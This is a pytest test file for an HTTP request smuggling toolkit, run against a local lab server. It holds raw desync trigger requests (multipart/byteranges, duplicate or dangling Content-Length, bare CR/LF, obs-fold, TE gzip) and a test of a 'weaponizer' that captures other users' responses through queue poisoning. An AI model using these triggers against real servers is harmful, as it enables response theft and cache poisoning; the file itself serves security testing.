"""
Integration and Unit Tests for Deterministic Harness, Anomaly Cascade,
Permutation Engine, and Dangling-Byte RQP against the local Test Lab Server.
"""

import time
import pytest

from anomaly_detector import AnomalyDetector
from database import Database
from deterministic_harness import DeterministicHarness
from permutator import VectorPermutator
from test_lab_server import TestLabServer
from weaponizer import RQPWeaponizer


@pytest.fixture(scope="module")
def lab_server():
    server = TestLabServer(host="127.0.0.1", port=8091)
    server.start()
    time.sleep(0.3)
    yield server
    server.stop()


def test_anomaly_detector_text_binary_blend():
    # Normal HTML header followed by binary null bytes
    binary_leak = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body>Normal page" + (b"\x00" * 50) + b"\xfe\xff" * 20
    anomalies = AnomalyDetector.analyze_response(binary_leak)
    assert any(a["type"] == "text_binary_blend" for a in anomalies)


def test_anomaly_detector_double_html():
    double_html = b"HTTP/1.1 200 OK\r\n\r\n<!DOCTYPE html><html><body>Page 1</body></html><!DOCTYPE html><html><body>Page 2</body></html>"
    anomalies = AnomalyDetector.analyze_response(double_html)
    assert any(a["type"] == "double_html" for a in anomalies)


def test_anomaly_detector_inline_headers():
    inline_headers = b"HTTP/1.1 200 OK\r\n\r\nNormal body\r\nServer: ATS\r\nX-Amzn-Trace-Id: Root=1-abc\r\n"
    anomalies = AnomalyDetector.analyze_response(inline_headers)
    assert any(a["type"] == "inline_headers" for a in anomalies)


def test_permutator_mutations():
    permutator = VectorPermutator()
    base_probe = {
        "raw_request": "POST / HTTP/1.1\r\nHost: target.local\r\nContent-Length: 20\r\n\r\n$PAYLOAD",
        "rationale": "Base trigger",
        "is_clean": True,
    }

    mutated_nul, name1 = permutator._mutate_path_nul(base_probe["raw_request"])
    assert "/nul" in mutated_nul

    mutated_dual_cl, name2 = permutator._mutate_dual_matching_cl(base_probe["raw_request"])
    assert mutated_dual_cl.count("Content-Length: 20") == 2

    mutated_dangling, name3 = permutator._mutate_dangling_byte(base_probe["raw_request"])
    assert "Content-Length: 1" in mutated_dangling


def test_deterministic_harness_contamination(lab_server):
    harness = DeterministicHarness(host="127.0.0.1", port=8091, use_tls=False, timeout=2.0)

    # Clean probe that does not trigger desync
    benign_probe = {
        "raw_request": "GET / HTTP/1.1\r\nHost: target.local\r\n\r\n",
        "rationale": "Benign probe",
        "is_clean": True,
    }
    is_vuln, _, details, _ = harness.run_evaluation(benign_probe)
    assert not is_vuln

    # Desync trigger probe (Content-Type: multipart/byteranges with nested marker)
    desync_probe = {
        "raw_request": (
            "POST / HTTP/1.1\r\n"
            "Host: target.local\r\n"
            "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
            "Content-Length: 150\r\n\r\n"
            "$PAYLOAD"
        ),
        "rationale": "RFC 2616 multipart/byteranges trigger",
        "is_clean": False,
    }
    is_vuln, desync_class, details, meta = harness.run_evaluation(desync_probe)
    assert is_vuln
    assert "marker reflected" in details.lower() or "contamination verified" in details.lower()


def test_weaponizer_dangling_byte(lab_server):
    weaponizer = RQPWeaponizer(host="127.0.0.1", port=8091, use_tls=False, timeout=2.0)
    trigger = (
        "POST / HTTP/1.1\r\n"
        "Host: target.local\r\n"
        "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
        "Content-Length: 100\r\n\r\n"
        "$PAYLOAD"
    )
    is_stolen, reason, evidence = weaponizer.test_dangling_byte_rqp(trigger, smuggled_endpoint="/captured")
    assert is_stolen
    assert "Autonomous RQP Confirmed" in reason


def test_fusion_normalization_resilience():
    from fusion_engine import FusionArbiter
    from probe_generator import ProbeGenerator

    arbiter = FusionArbiter(db=None)
    # Test dictionary input with raw field
    norm1 = arbiter._normalize_crlf({"raw_request": "GET / HTTP/1.1\r\nHost: test\r\n\r\n"})
    assert "GET / HTTP/1.1\r\n" in norm1

    # Test dictionary input with structured fields
    norm2 = arbiter._normalize_crlf({"method": "POST", "path": "/api", "headers": {"Content-Length": "10"}, "body": "test"})
    assert norm2.startswith("POST /api HTTP/1.1\r\n")
    assert "Content-Length: 10" in norm2

    # Test non-string input
    norm3 = arbiter._normalize_crlf(None)
    assert norm3 == ""

    generator = ProbeGenerator(db=None)
    norm4 = generator._normalize_newlines({"request": "GET / HTTP/1.1\nHost: test\n\n"})
    assert norm4 == "GET / HTTP/1.1\r\nHost: test\r\n\r\n"

    # Preserve intentional bare CR or double CR when CRLF is already present
    norm5 = generator._normalize_newlines("GET / HTTP/1.1\r\nHost: test\rX-Fold: 1\r\n\r\n")
    assert "\rX-Fold: 1\r\n" in norm5


def test_anomaly_detector_status_line_and_range_and_baseline():
    # Status-line reflection (e.g., COW< 200 OK or HTTP/0.9)
    cow_resp = b"COW< 200 OK\r\nContent-Type: text/html\r\n\r\nHello"
    anoms_cow = AnomalyDetector.analyze_response(cow_resp)
    assert any(a["type"] == "status_line_reflection" for a in anoms_cow)

    # Range cache mismatch (200 OK with Content-Range)
    range_resp = b"HTTP/1.1 200 OK\r\nContent-Range: bytes 0-10/100\r\n\r\n0123456789"
    anoms_range = AnomalyDetector.analyze_response(range_resp)
    assert any(a["type"] == "range_cache_mismatch" for a in anoms_range)

    # Baseline comparison with identical byte length but different content must NOT suppress anomalies
    baseline = b"HTTP/1.1 200 OK\r\nContent-Range: bytes 0-10/100\r\n\r\nABCDEFGHIJ"
    assert len(baseline) == len(range_resp)
    anoms_diff = AnomalyDetector.analyze_response(range_resp, baseline_response=baseline)
    assert any(a["type"] == "range_cache_mismatch" for a in anoms_diff)


def test_other_terminator_permutations():
    permutator = VectorPermutator()
    base_req = "POST / HTTP/1.1\r\nHost: target.local\r\nX-Custom: val\r\n\r\n$PAYLOAD"

    bare_lf, _ = permutator._mutate_line_terminator_bare_lf(base_req)
    assert "Host: target.local\n" in bare_lf

    bare_cr, _ = permutator._mutate_line_terminator_bare_cr(base_req)
    assert "\rX-Terminator-CR: 1" in bare_cr

    double_cr, _ = permutator._mutate_line_terminator_double_cr(base_req)
    assert "\r\r\n" in double_cr

    obs_fold, _ = permutator._mutate_obs_fold_terminator(base_req)
    assert "\r\n \t" in obs_fold

    te_gzip, _ = permutator._mutate_http10_te_gzip(base_req)
    assert "HTTP/1.0" in te_gzip and "Transfer-Encoding: gzip" in te_gzip

    intermediary, _ = permutator._mutate_intermediary_terminator_headers(base_req)
    assert "Early-Data: 1" in intermediary and "Max-Forwards: 0" in intermediary

    combined = permutator.combine_triggers(
        {"raw_request": base_req, "rationale": "A"},
        {"raw_request": "GET / HTTP/1.1\r\nHost: target.local\r\nForwarded: for=127.0.0.1\r\n\r\n", "rationale": "B"},
    )
    assert "Forwarded: for=127.0.0.1" in combined["raw_request"]

